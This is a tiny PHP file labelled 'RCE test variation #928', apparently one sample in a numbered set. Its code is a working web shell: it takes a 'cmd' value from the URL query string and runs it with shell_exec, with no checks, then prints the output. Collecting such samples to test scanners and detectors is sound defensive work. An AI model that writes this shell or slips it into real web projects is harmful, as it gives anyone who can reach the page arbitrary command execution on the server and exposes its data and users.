<?php
// RCE test variation #928
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>